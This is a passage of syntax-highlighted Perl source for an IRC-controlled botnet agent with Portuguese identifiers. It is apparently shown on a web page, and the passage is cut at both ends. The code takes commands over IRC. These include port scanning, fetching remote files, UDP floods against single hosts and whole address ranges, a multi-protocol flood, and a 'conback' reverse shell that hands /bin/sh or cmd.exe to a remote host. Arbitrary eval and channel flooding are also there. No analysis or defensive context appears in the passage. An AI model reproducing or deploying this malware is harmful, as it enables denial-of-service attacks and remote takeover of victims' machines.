class=\"line\">            <span class=\"keyword\">if</span> ($arg =~ <span class=\"regexp\">/^\\!(.*)/</span>) &#123;</span><br><span class=\"line\">              ircase(<span class=\"string\">&quot;$pn&quot;</span>,<span class=\"string\">&quot;$onde&quot;</span>,<span class=\"string\">&quot;$1&quot;</span>) <span class=\"keyword\">unless</span> ($natrix eq <span class=\"string\">&quot;$prefixo&quot;</span> <span class=\"keyword\">and</span> $arg =~ <span class=\"regexp\">/^\\!nick/</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">elsif</span> ($arg =~ <span class=\"regexp\">/^\\@(.*)/</span>) &#123;</span><br><span class=\"line\">                $ondep = $onde;</span><br><span class=\"line\">                $ondep = $pn <span class=\"keyword\">if</span> $onde eq $meunick;</span><br><span class=\"line\">                bfunc(<span class=\"string\">&quot;$ondep&quot;</span>,<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                shell(<span class=\"string\">&quot;$onde&quot;</span>, <span class=\"string\">&quot;$arg&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">/^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i</span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span> (<span class=\"keyword\">lc</span>($1) eq <span class=\"keyword\">lc</span>($meunick)) &#123;</span><br><span class=\"line\">         $meunick=$4;</span><br><span class=\"line\">         $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125; = $meunick;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">m/^\\:(.+?)\\s+433/i</span>) &#123;</span><br><span class=\"line\">       $meunick = getnick();</span><br><span class=\"line\">       nick(<span class=\"string\">&quot;$meunick&quot;</span>);</span><br><span class=\"line\">   &#125; <span class=\"keyword\">elsif</span> ($servarg =~ <span class=\"regexp\">m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i</span>) &#123;</span><br><span class=\"line\">       $meunick = $2;</span><br><span class=\"line\">       $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nick&#x27;</span>&#125; = $meunick;</span><br><span class=\"line\">       $irc_servers&#123;$IRC_cur_socket&#125;&#123;<span class=\"string\">&#x27;nome&#x27;</span>&#125; = <span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">       <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $canal (@canais) &#123;</span><br><span class=\"line\">         sendraw(<span class=\"string\">&quot;JOIN $canal&quot;</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">bfunc</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $printl = $_[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $funcarg = $_[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">my</span> $pid = <span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">waitpid</span>($pid, <span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span> ($funcarg =~ <span class=\"regexp\">/^portscan (.*)/</span>) &#123;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $hostip=<span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> @portas=(<span class=\"string\">&quot;21&quot;</span>,<span class=\"string\">&quot;22&quot;</span>,<span class=\"string\">&quot;23&quot;</span>,<span class=\"string\">&quot;25&quot;</span>,<span class=\"string\">&quot;53&quot;</span>,<span class=\"string\">&quot;80&quot;</span>,<span class=\"string\">&quot;110&quot;</span>,<span class=\"string\">&quot;143&quot;</span>,<span class=\"string\">&quot;6665&quot;</span>);</span><br><span class=\"line\">             <span class=\"keyword\">my</span> (@aberta, %porta_banner);</span><br><span class=\"line\">             <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $porta (@portas)  &#123;</span><br><span class=\"line\">                <span class=\"keyword\">my</span> $scansock = IO::Socket::INET-&gt;new(<span class=\"string\">PeerAddr =&gt;</span> $hostip, <span class=\"string\">PeerPort =&gt;</span> $porta, <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>, <span class=\"string\">Timeout =&gt;</span> <span class=\"number\">4</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ($scansock) &#123;</span><br><span class=\"line\">                   <span class=\"keyword\">push</span> (@aberta, $porta);</span><br><span class=\"line\">                   $scansock-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (@aberta) &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Portas abertas: @aberta&quot;</span>);</span><br><span class=\"line\">             &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                 sendraw($IRC_cur_socket,<span class=\"string\">&quot;PRIVMSG $printl :Nenhuma porta aberta foi encontrada.&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^download\\s+(.*)\\s+(.*)/</span>) &#123;</span><br><span class=\"line\">            getstore(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">            sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Download de $2 ($1) Conclu.do!&quot;</span>) <span class=\"keyword\">if</span> ($estatisticas);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^fullportscan\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $hostname=<span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $portainicial = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> $portafinal = <span class=\"string\">&quot;$3&quot;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> (@abertas, %porta_banner);</span><br><span class=\"line\">             <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $porta ($portainicial..$portafinal)</span><br><span class=\"line\">             &#123;</span><br><span class=\"line\">               <span class=\"keyword\">my</span> $scansock = IO::Socket::INET-&gt;new(<span class=\"string\">PeerAddr =&gt;</span> $hostname, <span class=\"string\">PeerPort =&gt;</span> $porta, <span class=\"string\">Proto =&gt;</span> <span class=\"string\">&#x27;tcp&#x27;</span>, <span class=\"string\">Timeout =&gt;</span> <span class=\"number\">4</span>);</span><br><span class=\"line\">               <span class=\"keyword\">if</span> ($scansock) &#123;</span><br><span class=\"line\">                 <span class=\"keyword\">push</span> (@abertas, $porta);</span><br><span class=\"line\">                 $scansock-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">                 <span class=\"keyword\">if</span> ($estatisticas) &#123;</span><br><span class=\"line\">                   sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Porta $porta aberta em $hostname&quot;</span>);</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (@abertas) &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :Portas abertas: @abertas&quot;</span>);</span><br><span class=\"line\">             &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket,<span class=\"string\">&quot;PRIVMSG $printl :Nenhuma porta aberta foi encontrada.&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^udp\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $pacotes;</span><br><span class=\"line\">              <span class=\"keyword\">socket</span>(Tr0x, PF_INET, SOCK_DGRAM, <span class=\"number\">17</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $alvo=inet_aton(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $porta = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $tempo = <span class=\"string\">&quot;$3&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacote;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacotese;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $fim = <span class=\"keyword\">time</span> + $tempo;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacota = <span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> (($pacota == <span class=\"string\">&quot;1&quot;</span>) &amp;&amp; ($pacotes == <span class=\"string\">&quot;1&quot;</span>)) &#123;</span><br><span class=\"line\">                $pacota = <span class=\"number\">0</span> <span class=\"keyword\">if</span> ((<span class=\"keyword\">time</span> &gt;= $fim) &amp;&amp; ($tempo != <span class=\"string\">&quot;0&quot;</span>));</span><br><span class=\"line\">                $pacote=$rand <span class=\"keyword\">x</span> $rand <span class=\"keyword\">x</span> $rand;</span><br><span class=\"line\">                $porta = <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span> <span class=\"number\">65000</span>) +<span class=\"number\">1</span> <span class=\"keyword\">if</span> ($porta == <span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">send</span>(Tr0x, <span class=\"number\">0</span>, $pacote, sockaddr_in($porta, $alvo)) <span class=\"keyword\">and</span> $pacotese++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($estatisticas)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo&quot;</span>.<span class=\"string\">&quot;s&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $1&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^udpfaixa\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $pacotes;</span><br><span class=\"line\">              <span class=\"keyword\">socket</span>(Tr0x, PF_INET, SOCK_DGRAM, <span class=\"number\">17</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $faixaip=<span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $porta = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $tempo = <span class=\"string\">&quot;$3&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacote;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacotes;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $fim = <span class=\"keyword\">time</span> + $tempo;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $pacota = <span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $alvo;</span><br><span class=\"line\">              <span class=\"keyword\">while</span> ($pacota == <span class=\"string\">&quot;1&quot;</span>) &#123;</span><br><span class=\"line\">                $pacota = <span class=\"number\">0</span> <span class=\"keyword\">if</span> ((<span class=\"keyword\">time</span> &gt;= $fim) &amp;&amp; ($tempo != <span class=\"string\">&quot;0&quot;</span>));</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $faixa = <span class=\"number\">1</span>; $faixa &lt;= <span class=\"number\">255</span>; $faixa++) &#123;</span><br><span class=\"line\">                  $alvo = inet_aton(<span class=\"string\">&quot;$faixaip.$faixa&quot;</span>);</span><br><span class=\"line\">                  $pacote=$rand <span class=\"keyword\">x</span> $rand <span class=\"keyword\">x</span> $rand;</span><br><span class=\"line\">                  $porta = <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span> <span class=\"number\">65000</span>) +<span class=\"number\">1</span> <span class=\"keyword\">if</span> ($porta == <span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">                  <span class=\"keyword\">send</span>(Tr0x, <span class=\"number\">0</span>, $pacote, sockaddr_in($porta, $alvo)) <span class=\"keyword\">and</span> $pacotese++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">                  <span class=\"keyword\">if</span> ($faixa &gt;= <span class=\"number\">255</span>) &#123;</span><br><span class=\"line\">                    $faixa = <span class=\"number\">1</span>;</span><br><span class=\"line\">                  &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($estatisticas)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Tempo de Pacotes\\002: $tempo&quot;</span>.<span class=\"string\">&quot;s&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total de Pacotes\\002: $pacotese&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Alvo dos Pacotes\\002: $alvo&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^conback\\s+(.*)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $host = <span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $porta = <span class=\"string\">&quot;$2&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $proto = <span class=\"keyword\">getprotobyname</span>(<span class=\"string\">&#x27;tcp&#x27;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $iaddr = inet_aton($host);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $paddr = sockaddr_in($porta, $iaddr);</span><br><span class=\"line\">              <span class=\"keyword\">my</span> $shell = <span class=\"string\">&quot;/bin/sh -i&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($^O eq <span class=\"string\">&quot;MSWin32&quot;</span>) &#123;</span><br><span class=\"line\">                $shell = <span class=\"string\">&quot;cmd.exe&quot;</span>;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">socket</span>(SOCKET, PF_INET, SOCK_STREAM, $proto) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span> <span class=\"string\">&quot;socket: $!&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">connect</span>(SOCKET, $paddr) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span> <span class=\"string\">&quot;connect: $!&quot;</span>;</span><br><span class=\"line\">              <span class=\"keyword\">open</span>(STDIN, <span class=\"string\">&quot;&gt;&amp;SOCKET&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">open</span>(STDOUT, <span class=\"string\">&quot;&gt;&amp;SOCKET&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">open</span>(STDERR, <span class=\"string\">&quot;&gt;&amp;SOCKET&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">system</span>(<span class=\"string\">&quot;$shell&quot;</span>);</span><br><span class=\"line\">              <span class=\"keyword\">close</span>(STDIN);</span><br><span class=\"line\">              <span class=\"keyword\">close</span>(STDOUT);</span><br><span class=\"line\">              <span class=\"keyword\">close</span>(STDERR);</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span> ($estatisticas)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Conectando-se em\\002: $host:$porta&quot;</span>);</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">           <span class=\"keyword\">elsif</span> ($funcarg =~ <span class=\"regexp\">/^oldpack\\s+(.*)\\s+(\\d+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $pacotes;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> ($dtime, %pacotes) = attacker(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$3&quot;</span>);</span><br><span class=\"line\">             $dtime = <span class=\"number\">1</span> <span class=\"keyword\">if</span> $dtime == <span class=\"number\">0</span>;</span><br><span class=\"line\">             <span class=\"keyword\">my</span> %bytes;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;igmp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;igmp&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;icmp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;icmp&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;o&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;o&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;udp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;udp&#125;</span>;</span><br><span class=\"line\">             $bytes<span class=\"string\">&#123;tcp&#125;</span> = $2 * $pacotes<span class=\"string\">&#123;tcp&#125;</span>;</span><br><span class=\"line\">             <span class=\"keyword\">unless</span> ($estatisticas)</span><br><span class=\"line\">             &#123;</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002 - Status -\\002&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Timp\\002: $dtime&quot;</span>.<span class=\"string\">&quot;secunde.&quot;</span>);</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total packet\\002: &quot;</span>.($pacotes<span class=\"string\">&#123;udp&#125;</span> + $pacotes<span class=\"string\">&#123;igmp&#125;</span> + $pacotes<span class=\"string\">&#123;icmp&#125;</span> +  $pacotes<span class=\"string\">&#123;o&#125;</span>));</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Total bytes\\002: &quot;</span>.($bytes<span class=\"string\">&#123;icmp&#125;</span> + $bytes <span class=\"string\">&#123;igmp&#125;</span> + $bytes<span class=\"string\">&#123;udp&#125;</span> + $bytes<span class=\"string\">&#123;o&#125;</span>));</span><br><span class=\"line\">               sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :\\002Flood\\002: &quot;</span>.int((($bytes<span class=\"string\">&#123;icmp&#125;</span>+$bytes<span class=\"string\">&#123;igmp&#125;</span>+$bytes<span class=\"string\">&#123;udp&#125;</span> + $bytes<span class=\"string\">&#123;o&#125;</span>)/<span class=\"number\">1024</span>)/$dtime).<span class=\"string\">&quot; kbps&quot;</span>);</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ircase</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($kem, $printl, $case) = @_;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span> ($case =~ <span class=\"regexp\">/^join (.*)/</span>) &#123;</span><br><span class=\"line\">     j(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^part (.*)/</span>) &#123;</span><br><span class=\"line\">      p(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^rejoin\\s+(.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $chan = $1;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ($chan =~ <span class=\"regexp\">/^(\\d+) (.*)/</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $ca = <span class=\"number\">1</span>; $ca &lt;= $1; $ca++ ) &#123;</span><br><span class=\"line\">          p(<span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">          j(<span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">          p(<span class=\"string\">&quot;$chan&quot;</span>);</span><br><span class=\"line\">          j(<span class=\"string\">&quot;$chan&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^op/</span>) &#123;</span><br><span class=\"line\">      op(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;op&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">3</span>);</span><br><span class=\"line\">      op(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^deop/</span>) &#123;</span><br><span class=\"line\">      deop(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;deop&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">my</span> $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">5</span>);</span><br><span class=\"line\">      deop(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^voice/</span>) &#123;</span><br><span class=\"line\">      voice(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;voice&quot;</span>;</span><br><span class=\"line\">      $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">6</span>);</span><br><span class=\"line\">      voice(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^devoice/</span>) &#123;</span><br><span class=\"line\">      devoice(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;$kem&quot;</span>) <span class=\"keyword\">if</span> $case eq <span class=\"string\">&quot;devoice&quot;</span>;</span><br><span class=\"line\">      $oarg = <span class=\"keyword\">substr</span>($case, <span class=\"number\">8</span>);</span><br><span class=\"line\">      devoice(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>) <span class=\"keyword\">if</span> ($oarg =~ <span class=\"regexp\">/(\\S+)\\s+(\\S+)/</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^msg\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^flood\\s+(\\d+)\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $cf = <span class=\"number\">1</span>; $cf &lt;= $1; $cf++) &#123;</span><br><span class=\"line\">        msg(<span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$3&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $cf = <span class=\"number\">1</span>; $cf &lt;= $1; $cf++) &#123;</span><br><span class=\"line\">        ctcp(<span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$3&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^ctcp\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      ctcp(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^invite\\s+(\\S+) (.*)/</span>) &#123;</span><br><span class=\"line\">      invite(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^nick (.*)/</span>) &#123;</span><br><span class=\"line\">      nick(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^conecta\\s+(\\S+)\\s+(\\S+)/</span>) &#123;</span><br><span class=\"line\">       conectar(<span class=\"string\">&quot;$2&quot;</span>, <span class=\"string\">&quot;$1&quot;</span>, <span class=\"number\">6667</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^send\\s+(\\S+)\\s+(\\S+)/</span>) &#123;</span><br><span class=\"line\">      DCC::SEND(<span class=\"string\">&quot;$1&quot;</span>, <span class=\"string\">&quot;$2&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^raw (.*)/</span>) &#123;</span><br><span class=\"line\">      sendraw(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^eval (.*)/</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">eval</span> <span class=\"string\">&quot;$1&quot;</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^entra\\s+(\\S+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">sleep</span> <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span>($2));</span><br><span class=\"line\">    j(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span 